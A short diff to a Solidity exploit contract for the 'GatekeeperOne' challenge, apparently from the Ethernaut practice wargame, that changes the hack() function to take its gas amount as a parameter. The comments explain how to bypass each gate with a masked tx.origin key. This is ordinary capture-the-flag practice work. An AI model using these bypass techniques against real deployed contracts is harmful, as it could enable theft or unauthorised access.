@@ -43,7 +43,7 @@ contract GateKeeperExploit {
         gatekeeper = GatekeeperOne(_add);
     }
 
-    function hack() external returns (bool) {
+    function hack(uint256 inputGas) external returns (bool) {
         // since we are sending via smart contract
         // first condition require(msg.sender != tx.origin) will be satisfied
 
@@ -64,7 +64,7 @@ contract GateKeeperExploit {
         // to satisy this, we just need a bytes8 based on tx origin
         // use uint64(uint160(tx.origin)) && 0xffffffff0000ffff and we should get third condition trye
         bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
-        return gatekeeper.enter{gas: 802929}(key);
+        return gatekeeper.enter{gas: inputGas}(key);
     }
 
     function test()
